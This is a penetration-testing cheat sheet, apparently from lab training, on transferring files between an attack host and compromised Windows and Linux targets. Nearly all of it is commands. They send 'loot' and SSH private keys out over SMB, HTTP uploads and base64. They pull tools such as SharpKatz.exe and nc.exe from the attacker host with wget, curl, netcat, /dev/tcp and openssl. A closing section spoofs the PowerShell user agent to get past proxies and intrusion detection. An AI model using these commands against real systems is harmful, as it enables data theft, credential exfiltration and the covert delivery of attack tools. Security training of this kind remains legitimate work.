Windows Upload Methods
PowerShell Upload Windows ↑ Upload
# On attack host — start upload server $ pip3 install uploadserver $ python3 -m uploadserver 8080 # On Windows — upload a file PS> Invoke-WebRequest -Uri http://10.10.14.1:8080/upload -Method POST -InFile C:\data.txt
Base64 Exfil Windows ↑ Upload
# On Windows — encode and copy output PS> [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\loot.zip")) # On attack host — decode $ echo "BASE64_STRING" | base64 -d > loot.zip
SMB Server (Impacket) Both
# On attack host — start SMB share $ impacket-smbserver share $(pwd) -smb2support # On Windows — copy TO attack host C:\> copy C:\loot.txt \\10.10.14.1\share\loot.txt # On Windows — copy FROM attack host C:\> copy \\10.10.14.1\share\payload.exe C:\payload.exe
💡 SMB is the go-to method for Windows targets
No extra tools needed on the target. Works in CMD, PowerShell, and from most Windows apps. Add -smb2support to avoid SMBv1 errors on modern Windows.

Linux Download Methods
wget Linux
$ wget http://10.10.14.1/file.sh -O /tmp/file.sh # Uppercase -O = output file
cURL Linux
$ curl http://10.10.14.1/file.sh -o /tmp/file.sh # Lowercase -o = output file
Memory Trick: wget = Uppercase -O, cURL = lowercase -o
Bash /dev/tcp (No Tools Available) Linux FALLBACK

Works when wget/curl/python aren't installed. Requires Bash 2.04+.

# Connect to attacker's web server $ exec 3<>/dev/tcp/10.10.14.1/80 # Send HTTP GET request $ echo -e "GET /file.sh HTTP/1.1\n\n">&3 # Print the response (the file content) $ cat <&3
SCP (SSH) Linux
# Download from target $ scp user@target:/remote/path/file.txt ./local/ # Upload to target $ scp ./local/file.txt user@target:/remote/path/
Base64 Encode/Decode Linux
# Check hash before encoding $ md5sum id_rsa # Encode $ cat id_rsa | base64 -w 0; echo # On target — decode $ echo "BASE64_STRING" | base64 -d > id_rsa # Verify hash matches $ md5sum id_rsa

Netcat / Ncat File Transfers
Target Listening (Receive) Both
# On target — listen and receive target$ nc -l -p 8000 > SharpKatz.exe target$ ncat -l -p 8000 --recv-only > SharpKatz.exe # On attack host — send attack$ nc -q 0 TARGET_IP 8000 < SharpKatz.exe attack$ ncat --send-only TARGET_IP 8000 < SharpKatz.exe
Attack Host Listening (Send) Both
# On attack host — serve file attack$ sudo nc -l -p 443 -q 0 < SharpKatz.exe attack$ sudo ncat -l -p 443 --send-only < SharpKatz.exe # On target — connect and download target$ nc ATTACK_IP 443 > SharpKatz.exe target$ ncat ATTACK_IP 443 --recv-only > SharpKatz.exe
Bash /dev/tcp Fallback (No Netcat) Linux FALLBACK
# On attack host — serve file via nc attack$ sudo nc -l -p 443 -q 0 < SharpKatz.exe # On target — download via /dev/tcp target$ cat < /dev/tcp/ATTACK_IP/443 > SharpKatz.exe

PowerShell Remoting (WinRM)

Uses WinRM over TCP/5985 (HTTP) or 5986 (HTTPS). Requires admin access or Remote Management Users group membership.

Copy Files via PS Sessions Windows
# Test connectivity PS> Test-NetConnection -ComputerName DATABASE01 -Port 5985 # Create session PS> $Session = New-PSSession -ComputerName DATABASE01 # Upload to remote host PS> Copy-Item -Path C:\payload.exe -ToSession $Session -Destination C:\Users\Administrator\Desktop\ # Download from remote host PS> Copy-Item -Path "C:\Users\Administrator\Desktop\loot.txt" -Destination C:\ -FromSession $Session

RDP Drive Mounting
Mount Local Folder via RDP Both RECOMMENDED
# xfreerdp — mount current directory as \\tsclient\share $ xfreerdp /v:10.10.10.132 /u:administrator /p:'Password0@' /drive:share,/home/user/files # rdesktop $ rdesktop 10.10.10.132 -u administrator -p 'Password0@' -r disk:linux='/home/user/files'

Inside the RDP session, browse to \\tsclient\share in File Explorer to access the mounted folder. Drag and drop files in both directions.

💡 RDP Drive Security
The mounted drive is only accessible to your RDP session — other users logged into the same machine can't see it, even if they hijack the session.

Living off The Land

LOLBAS (Windows) and GTFOBins (Linux) catalogue legitimate system binaries that can be abused for downloads, uploads, command execution, and file operations.

LOLBAS Windows

lolbas-project.github.io — search /download or /upload

Key binaries: certutil.exe, bitsadmin, certreq.exe, mshta.exe, regsvr32.exe

GTFOBins Linux

gtfobins.github.io — search +file download or +file upload

Key binaries: openssl, wget, curl, bash, python, nc

OpenSSL File Transfer (GTFOBins) Linux
# On attack host — create cert + serve file $ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem $ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh # On target — download file $ openssl s_client -connect 10.10.14.1:80 -quiet > LinEnum.sh

Evading Detection
Changing PowerShell User Agent Windows

Default PowerShell User-Agent string is flagged by many proxies and IDS. Spoof a browser to blend in.

# List available user agents PS> [Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name, @{label="User Agent"; Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl # Download with Chrome user agent PS> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome PS> Invoke-WebRequest http://10.10.14.1/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
💡 Evasion Strategy Summary
Use LOLBAS/GTFOBins to avoid dropping new tools. Change user agents to avoid proxy/IDS detection. Encrypt transfers to prevent content inspection. Use base64 encoding to avoid file-on-disk triggers.
